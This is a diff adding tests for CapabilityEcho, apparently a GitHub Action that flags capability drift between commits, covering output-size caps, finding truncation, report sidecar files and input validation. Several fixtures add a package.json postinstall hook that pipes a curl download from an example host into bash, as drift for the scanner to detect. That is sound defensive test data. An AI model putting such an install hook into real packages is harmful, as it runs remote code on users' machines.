@@ -24,6 +24,9 @@ test('action.yml exposes capability drift outputs', async () => {
   assert.match(action, /report-markdown/);
   assert.match(action, /report-json/);
   assert.match(action, /fail-on/);
+  assert.match(action, /max-findings/);
+  assert.match(action, /max-output-bytes/);
+  assert.match(action, /report-file/);
 });
 
 test('action.yml runs the checked-in JavaScript action without installing PR-local scripts first', async () => {
@@ -330,6 +333,194 @@ test('JavaScript action normalizes fail-on input before enforcing threshold', as
     assert.match(outputs, /^rating=critical$/m);
     assert.match(outputs, /^top-recommendations=/m);
     assert.match(summary, /## Top recommendations/);
+  } finally {
+    await fx.cleanup();
+  }
+});
+
+test('max-output-bytes suppresses oversized markdown/json outputs but keeps the rating intact', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-max-output-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'output-cap', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
+
+  try {
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'output-cap',
+          private: true,
+          scripts: { test: 'vitest', postinstall: 'curl https://install.example.com/setup.sh | bash' }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
+
+    await execFileAsync(process.execPath, ['dist/action.js'], {
+      cwd: packageRoot,
+      env: {
+        ...process.env,
+        INPUT_REPO: fx.repo,
+        INPUT_BASE: base,
+        INPUT_HEAD: head,
+        INPUT_FAIL_ON: 'none',
+        'INPUT_MAX-OUTPUT-BYTES': '128',
+        GITHUB_OUTPUT: outputPath,
+        GITHUB_STEP_SUMMARY: summaryPath
+      }
+    });
+
+    const outputs = await readFile(outputPath, 'utf8');
+    const summary = await readFile(summaryPath, 'utf8');
+
+    assert.match(outputs, /^rating=critical$/m);
+    assert.match(outputs, /^finding-count=4$/m);
+    assert.match(outputs, /CapabilityEcho output suppressed: payload exceeded max-output-bytes=128/);
+    assert.match(summary, /# CapabilityEcho capability drift: CRITICAL/, 'step summary must keep the full markdown report');
+  } finally {
+    await fx.cleanup();
+  }
+});
+
+test('max-findings truncates the rendered report but preserves the full rating', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-max-findings-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'cap-trunc', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
+
+  try {
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'cap-trunc',
+          private: true,
+          scripts: { test: 'vitest', postinstall: 'curl https://install.example.com/setup.sh | bash' }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
+
+    await execFileAsync(process.execPath, ['dist/action.js'], {
+      cwd: packageRoot,
+      env: {
+        ...process.env,
+        INPUT_REPO: fx.repo,
+        INPUT_BASE: base,
+        INPUT_HEAD: head,
+        INPUT_FAIL_ON: 'none',
+        'INPUT_MAX-FINDINGS': '1',
+        GITHUB_OUTPUT: outputPath,
+        GITHUB_STEP_SUMMARY: summaryPath
+      }
+    });
+
+    const outputs = await readFile(outputPath, 'utf8');
+    const summary = await readFile(summaryPath, 'utf8');
+
+    assert.match(outputs, /^rating=critical$/m, 'rating must reflect the full findings');
+    assert.match(outputs, /^finding-count=4$/m, 'finding-count must reflect the full set');
+    assert.match(summary, /truncated this report to the top 1 of 4 findings/);
+  } finally {
+    await fx.cleanup();
+  }
+});
+
+test('report-file writes the full markdown and JSON sidecar', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-report-file-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'report-file-fx', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+
+  try {
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'report-file-fx',
+          private: true,
+          scripts: { test: 'vitest', postinstall: 'curl https://install.example.com/setup.sh | bash' }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
+
+    await execFileAsync(process.execPath, ['dist/action.js'], {
+      cwd: packageRoot,
+      env: {
+        ...process.env,
+        INPUT_REPO: fx.repo,
+        INPUT_BASE: base,
+        INPUT_HEAD: head,
+        INPUT_FAIL_ON: 'none',
+        'INPUT_MAX-FINDINGS': '1',
+        'INPUT_REPORT-FILE': 'capability-echo-report.md'
+      }
+    });
+
+    const fullMd = await readFile(join(fx.repo, 'capability-echo-report.md'), 'utf8');
+    const fullJson = await readFile(join(fx.repo, 'capability-echo-report.md.json'), 'utf8');
+
+    assert.match(fullMd, /# CapabilityEcho capability drift: CRITICAL/);
+    const parsed = JSON.parse(fullJson);
+    assert.equal(parsed.findingCount, 4, 'sidecar must contain the full finding set, not the truncated view');
+  } finally {
+    await fx.cleanup();
+  }
+});
+
+test('rejects non-integer max-findings input', async () => {
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-bad-max-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'bad-max', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+
+  try {
+    const result = await execFileAsync(process.execPath, ['dist/action.js'], {
+      cwd: packageRoot,
+      env: {
+        ...process.env,
+        INPUT_REPO: fx.repo,
+        INPUT_BASE: 'HEAD',
+        INPUT_HEAD: 'HEAD',
+        INPUT_FAIL_ON: 'none',
+        'INPUT_MAX-FINDINGS': 'abc'
+      }
+    }).then(
+      ({ stdout, stderr }) => ({ code: 0, stdout, stderr }),
+      (error) => ({
+        code: typeof error === 'object' && error && 'code' in error ? error.code : undefined,
+        stdout: typeof error === 'object' && error && 'stdout' in error ? String(error.stdout) : '',
+        stderr: typeof error === 'object' && error && 'stderr' in error ? String(error.stderr) : ''
+      })
+    );
+
+    assert.equal(result.code, 2);
+    assert.match(result.stdout, /Invalid max-findings value 'abc'/);
   } finally {
     await fx.cleanup();
   }
